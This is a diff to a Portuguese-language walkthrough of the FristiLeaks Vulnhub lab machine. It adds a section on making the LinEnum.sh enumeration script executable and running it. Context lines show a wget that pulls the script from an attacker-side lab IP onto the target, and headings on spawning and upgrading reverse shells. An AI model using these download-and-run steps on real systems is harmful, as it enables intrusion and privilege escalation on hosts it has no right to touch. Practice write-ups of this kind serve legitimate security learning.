@@ -36,6 +36,7 @@ Uma pequena VM foi feita para um encontro de hackers informais holandeses chamad
     - [Spawn Shell](#spawn-shell)
     - [Upgrading to a fully interactive reverse shell](#upgrading-to-a-fully-interactive-reverse-shell)
     - [File Transfer](#file-transfer)
+    - [LinEnum](#linenum)
 
 ## Information Gathering
 
@@ -179,3 +180,13 @@ Na máquina alvo realize o download.
 `wget http://10.0.1.104/LinEnum.sh`
 
 ![trasnfer](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_12-50.png)
+
+### LinEnum
+
+Adicione permissão para executar.
+
+`chmod +x LinEnum.sh`
+
+Agora execute o `./LinEnum`
+
+![linenum](https://raw.githubusercontent.com/PentestMafia/Vulnhub/master/assets/images/fristileaks-1-3/2019-05-18_13-05.png)
